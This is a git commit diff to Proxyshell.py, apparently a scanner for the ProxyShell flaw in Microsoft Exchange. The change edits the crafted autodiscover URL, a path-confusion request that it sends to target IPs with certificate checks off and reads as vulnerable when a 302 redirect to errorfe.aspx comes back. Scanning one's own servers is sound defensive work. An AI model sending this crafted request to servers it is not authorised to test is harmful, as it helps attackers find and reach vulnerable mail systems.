c590b01bdb278f625bf03b5c15ccaa39198e3748
mithridates <84065796+mithridates1313@users.noreply.github.com>
2021-10-06 15:05:20 +0330

    Update Proxyshell.py

--- Proxyshell.py
+++ Proxyshell.py
@@ -5,7 +5,7 @@ import re
 requests.packages.urllib3.disable_warnings()
 def scanner(ip):
     ip = ip.strip()
-    url = f"https://{ip}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
+    url = f"https://{ip}/autodiscover/autodiscover.json?@mss.com/owa/?&Email=autodiscover/autodiscover.json%3F@mss.com"
     try:
         req = requests.get(url, timeout=10, verify=False, allow_redirects=False)
         if (req.status_code == 302) and (re.search("errorfe.aspx", req.text)):
